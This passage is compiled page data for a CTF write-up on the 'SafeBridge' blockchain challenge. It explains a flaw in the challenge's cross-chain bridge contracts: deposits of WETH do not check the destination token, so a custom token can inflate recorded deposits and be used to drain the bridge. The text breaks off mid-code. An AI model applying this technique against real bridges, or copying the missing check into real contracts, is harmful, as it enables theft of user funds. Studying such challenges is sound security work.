{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var p=Object.create;var t=Object.defineProperty;var r=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var u=Object.getPrototypeOf,h=Object.prototype.hasOwnProperty;var l=e=>t(e,\"__esModule\",{value:!0});var m=(e,s)=>()=>(s||e((s={exports:{}}).exports,s),s.exports),N=(e,s)=>{l(e);for(var c in s)t(e,c,{get:s[c],enumerable:!0})},k=(e,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let a of d(s))!h.call(e,a)&&a!==\"default\"&&t(e,a,{get:()=>s[a],enumerable:!(c=r(s,a))||c.enumerable});return e},_=e=>k(l(t(e!=null?p(u(e)):{},\"default\",e&&e.__esModule&&\"default\"in e?{get:()=>e.default,enumerable:!0}:{value:e,enumerable:!0})),e);var o=m((w,i)=>{i.exports=_jsx_runtime});var T={};N(T,{default:()=>b,frontmatter:()=>g});var n=_(o()),g={title:\"Real World CTF 6th \\u2013 SafeBridge\",date:\"2024-01-29\",draft:!1,authors:[\"yanhu\"],tags:[\"Real World CTF 6th\",\"Blockchain\",\"Web3\",\"Smart Contract\",\"Solidity\",\"Cross Chain\",\"Data Validation\"],summary:\"Exploiting cross-chain bridge vulnerabilities to drain tokens from the bridge\",canonical:\"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/safebridge\"};function f(e={}){let{wrapper:s}=e.components||{};return s?(0,n.jsx)(s,Object.assign({},e,{children:(0,n.jsx)(c,{})})):c();function c(){let a=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",pre:\"pre\",h3:\"h3\"},e.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(a.h2,{id:\"safebridge-blockchain-17-solves\",children:[(0,n.jsx)(a.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#safebridge-blockchain-17-solves\",children:(0,n.jsx)(a.span,{className:\"icon icon-link\"})}),\"SafeBridge (Blockchain, 17 Solves)\"]}),`\n`,(0,n.jsxs)(a.blockquote,{children:[`\n`,(0,n.jsx)(a.p,{children:\"I\\u2019ve crafted what I believed to be an ultra-safe token bridge. Don\\u2019t believe it?\"}),`\n`,(0,n.jsx)(a.p,{children:(0,n.jsx)(a.a,{href:\"https://github.com/YanhuiJessica/Chictf-Writeups/raw/master/docs/blockchain/static/safebridge.zip\",children:\"Attachment\"})}),`\n`]}),`\n`,(0,n.jsxs)(a.p,{children:[\"This challenge is derived from \",(0,n.jsx)(a.a,{href:\"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/paradigm/enterprise_blockchain/\",children:\"Enterprise Blockchain\"}),\" in Paradigm CTF 2023. The \",(0,n.jsx)(a.code,{children:\"CrossDomainMessenger.sendMessage()\"}),\" function, which can be used for sending cross-chain messages, is still publicly available. The difference is that when finalizing a cross-chain token transfer, it will verify whether the initiator of the cross-chain message is the bridge on the corresponding chain. Thus, cross-chain token transfers are only possible via \",(0,n.jsx)(a.code,{children:\"L1ERC20Bridge.depositERC20() / L1ERC20Bridge.depositERC20To()\"}),\" and \",(0,n.jsx)(a.code,{children:\"L2ERC20Bridge.withdraw() / L2ERC20Bridge.withdrawTo()\"}),\":\"]}),`\n`,(0,n.jsx)(a.pre,{className:\"language-js\",children:(0,n.jsxs)(a.code,{className:\"language-js code-highlight\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"finalizeERC20Withdrawal\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"public\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"onlyFromCrossDomainAccount\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token parameter\",children:\"l2TokenBridge\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    deposits\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" deposits\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token constant\",children:\"IERC20\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"safeTransfer\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    emit \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"ERC20WithdrawalFinalized\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"modifier \",(0,n.jsx)(a.span,{className:\"token function\",children:\"onlyFromCrossDomainAccount\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token parameter\",children:\"address _sourceDomainAccount\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"require\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"address\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getCrossDomainMessenger\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"messenger contract unauthenticated\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"require\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token function\",children:\"getCrossDomainMessenger\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"xDomainMessageSender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" _sourceDomainAccount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"wrong sender of cross-domain message\"'}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    _\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(a.p,{children:[\"To withdraw WETH from L1Bridge, we need to invoke the \",(0,n.jsx)(a.code,{children:\"L2ERC20Bridge.withdraw()\"}),\" function. In \",(0,n.jsx)(a.code,{children:\"_initiateWithdrawal()\"}),\", \",(0,n.jsx)(a.code,{children:\"l1Token\"}),\" is read from \",(0,n.jsx)(a.code,{children:\"_l2Token\"}),\". Since the \",(0,n.jsx)(a.code,{children:\"_l2Token\"}),\" provided by users could be a custom token, then only the value of \",(0,n.jsx)(a.code,{children:\"L1ERC20Bridge.deposits[weth][_l2Token]\"}),\" should not be less than the amount to be transferred.\"]}),`\n`,(0,n.jsx)(a.pre,{className:\"language-js\",children:(0,n.jsxs)(a.code,{className:\"language-js code-highlight\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"withdraw\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" external virtual \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"_initiateWithdrawal\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"_initiateWithdrawal\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" internal \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL2StandardERC20\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"burn\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    address l1Token \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL2StandardERC20\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"l1Token\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    bytes memory message\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l2Token \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"Lib_PredeployAddresses\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token constant\",children:\"L2_WETH\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        message \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"encodeWithSelector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL1ERC20Bridge\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"finalizeWethWithdrawal\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"selector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword control-flow\",children:\"else\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        message \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"encodeWithSelector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL1ERC20Bridge\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"finalizeERC20Withdrawal\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"selector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),` _amount\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"sendCrossDomainMessage\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1TokenBridge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" message\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    emit \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"WithdrawalInitiated\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(a.p,{children:[\"When initiating a transfer from L1 to L2, if \",(0,n.jsx)(a.code,{children:\"_l1Token\"}),\" is \",(0,n.jsx)(a.code,{children:\"weth\"}),\", the corresponding amount of \",(0,n.jsx)(a.code,{children:\"L2_WETH\"}),\" will be minted in \",(0,n.jsx)(a.code,{children:\"L2ERC20Bridge.finalizeDeposit()\"}),\". However, \",(0,n.jsx)(a.code,{children:\"_l2Token\"}),\" may not be \",(0,n.jsx)(a.code,{children:\"L2_WETH\"}),\". If \",(0,n.jsx)(a.code,{children:\"_l2Token\"}),\" is a custom token controlled by the player, not only can player obtain \",(0,n.jsx)(a.code,{children:\"L2_WETH\"}),\", but \",(0,n.jsx)(a.code,{children:\"deposits[weth][_l2Token]\"}),\" will also increase:\"]}),`\n`,(0,n.jsx)(a.pre,{className:\"language-js\",children:(0,n.jsxs)(a.code,{className:\"language-js code-highlight\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"depositERC20\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" external virtual \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"_initiateERC20Deposit\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" msg\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"sender\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"_initiateERC20Deposit\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`        internal\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token constant\",children:\"IERC20\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"safeTransferFrom\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"address\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token keyword\",children:\"this\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    bytes memory message\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" weth\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),\" \",(0,n.jsx)(a.span,{className:\"token comment\",children:\"// @audit-issue no check if _l2Token is L2_WETH\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        message \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"encodeWithSelector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL2ERC20Bridge\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"finalizeDeposit\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"selector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"address\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"Lib_PredeployAddresses\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token constant\",children:\"L2_WETH\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),` _amount\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword control-flow\",children:\"else\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        message \",(0,n.jsx)(a.span,{className:\"token 